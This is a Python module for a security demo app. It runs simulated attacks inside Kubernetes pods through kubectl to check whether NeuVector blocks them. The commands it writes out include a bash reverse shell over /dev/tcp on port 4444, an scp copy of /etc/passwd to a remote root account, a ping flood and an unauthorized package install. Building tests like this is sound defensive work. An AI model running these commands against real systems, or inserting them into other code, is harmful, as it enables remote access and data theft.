"""Attack simulation demo - simulate various attack scenarios."""

from typing import Any, AsyncGenerator

from app.core.kubectl import Kubectl
from app.config import NAMESPACE
from app.demos.base import DemoModule, DemoParameter
from app.demos.registry import DemoRegistry


@DemoRegistry.register
class AttackSimulationDemo(DemoModule):
    """Demo to simulate attack scenarios (DoS, package install, file transfer, reverse shell)."""

    id = "attack"
    name = "Attack Simulation"
    description = "Simulate attack scenarios (DoS, package install, file transfer, reverse shell) to test NeuVector blocking capabilities."
    category = "Security Testing"
    icon = "⚔️"

    @property
    def parameters(self) -> list[DemoParameter]:
        return [
            DemoParameter(
                name="pod_name",
                label="Source Pod",
                type="select",
                default="production1",
                required=True,
                options=[
                    {"value": "production1", "label": "Espion1"},
                    {"value": "web1", "label": "Cible1"},
                ],
                help_text="Pod from which to run the attack simulation",
            ),
            DemoParameter(
                name="attack_type",
                label="Attack Type",
                type="select",
                default="dos_ping",
                required=True,
                options=[
                    {"value": "dos_ping", "label": "DoS Ping Flood (40KB)"},
                    {"value": "zypper_install", "label": "Package Install (zypper)"},
                    {"value": "scp_transfer", "label": "File Transfer (scp)"},
                    {"value": "reverse_shell", "label": "Reverse Shell"},
                ],
                help_text="Type of attack to simulate",
            ),
            DemoParameter(
                name="target",
                label="Target",
                type="select",
                default="web1",
                required=True,
                options=[
                    {"value": "web1", "label": "Cible1 (web1)"},
                    {"value": "external", "label": "External (example.com)"},
                ],
                help_text="Target of the attack",
            ),
        ]

    async def _resolve_target(self, kubectl: Kubectl, target: str) -> str:
        """Resolve the target address based on target selection."""
        if target == "web1":
            # Get the pod IP for web1
            try:
                ip_output = []
                async for line in kubectl.run_command([
                    "get", "pod", "web1",
                    "-n", NAMESPACE,
                    "-o", "jsonpath={.status.podIP}"
                ]):
                    ip_output.append(line)
                pod_ip = "".join(ip_output).strip()
                if pod_ip and not pod_ip.startswith("["):
                    return pod_ip
            except Exception:
                pass
            # Fallback to service DNS name
            return f"web1.{NAMESPACE}.svc.cluster.local"
        else:
            # External target
            return "example.com"

    async def execute(
        self,
        kubectl: Kubectl,
        params: dict[str, Any],
    ) -> AsyncGenerator[str, None]:
        attack_type = params.get("attack_type", "dos_ping")
        pod_name = params.get("pod_name", "production1")
        target = params.get("target", "web1")

        # Get attack type label for display
        attack_labels = {
            "dos_ping": "DoS Ping Flood (40KB payload)",
            "zypper_install": "Package Install (zypper)",
            "scp_transfer": "File Transfer (scp)",
            "reverse_shell": "Reverse Shell",
        }
        attack_label = attack_labels.get(attack_type, attack_type)

        yield f"[INFO] Starting attack simulation: {attack_label}"
        yield f"[INFO] Source pod: {pod_name}"
        yield f"[INFO] Target: {target}"
        yield ""

        # Resolve target address
        target_addr = await self._resolve_target(kubectl, target)
        yield f"[INFO] Resolved target address: {target_addr}"
        yield ""

        # Build command based on attack type
        if attack_type == "dos_ping":
            # DoS Ping Flood with 40KB payload
            cmd_args = ["ping", "-s", "40000", "-c", "5", target_addr]
            yield "[INFO] Simulating DoS attack with oversized ICMP packets (40KB payload)"
        elif attack_type == "zypper_install":
            # Package installation attempt
            cmd_args = ["zypper", "install", "-y", "curl"]
            yield "[INFO] Attempting unauthorized package installation"
        elif attack_type == "scp_transfer":
            # File transfer of sensitive data
            cmd_args = ["scp", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
                       "/etc/passwd", f"root@{target_addr}:/tmp/"]
            yield "[INFO] Attempting to transfer sensitive file (/etc/passwd)"
        elif attack_type == "reverse_shell":
            # Reverse shell attempt - will be blocked
            # We use bash -c to attempt the connection
            cmd_args = ["bash", "-c", f"bash -i >& /dev/tcp/{target_addr}/4444 0>&1"]
            yield "[INFO] Attempting reverse shell connection"
        else:
            yield f"[ERROR] Unknown attack type: {attack_type}"
            return

        yield f"[CMD] kubectl exec {pod_name} -n {NAMESPACE} -- {' '.join(cmd_args)}"
        yield ""

        # Execute command in pod and track if process was killed
        process_killed = False
        command_success = False
        permission_denied = False

        try:
            async for line in kubectl.exec_in_pod(
                pod_name=pod_name,
                command=cmd_args,
                namespace=NAMESPACE,
                timeout=30,
            ):
                yield line
                # Check for various blocking/error indicators
                lower_line = line.lower()
                if 'exit code 137' in lower_line or 'command terminated' in lower_line:
                    process_killed = True
                if 'permission denied' in lower_line or 'operation not permitted' in lower_line:
                    permission_denied = True
                if 'not found' in lower_line or 'no such file' in lower_line:
                    permission_denied = True
                # Check for success indicators based on attack type
                if attack_type == "dos_ping":
                    if 'bytes from' in lower_line or 'time=' in lower_line:
                        command_success = True
                elif attack_type == "zypper_install":
                    if 'already installed' in lower_line or 'nothing to do' in lower_line:
                        command_success = True
                elif attack_type == "scp_transfer":
                    if '100%' in line:
                        command_success = True
        except Exception as e:
            error_str = str(e).lower()
            if 'exit code 137' in error_str or 'command terminated' in error_str:
                process_killed = True
            elif 'exit code 126' in error_str or 'exit code 127' in error_str:
                permission_denied = True
            yield f"[ERROR] {str(e)}"

        yield ""

        # Report results
        if process_killed:
            yield f"[BLOCKED] Attack '{attack_label}' was blocked by NeuVector!"
            yield "[INFO] Process was killed (exit code 137 - SIGKILL)"
            yield "[INFO] This indicates the process profile is in Protect mode"
            raise Exception("Attack blocked by NeuVector")
        elif permission_denied:
            yield f"[BLOCKED] Attack '{attack_label}' failed - permission denied or command not found"
            yield "[INFO] This may indicate process profile blocking or missing binary"
            raise Exception("Attack blocked - permission denied")
        elif command_success:
            yield f"[WARNING] Attack '{attack_label}' succeeded!"
            yield "[INFO] Consider switching to Protect mode to block this attack"
        else:
            yield f"[INFO] Attack simulation '{attack_label}' completed"
            yield "[INFO] Check NeuVector Security Events for any violations detected"
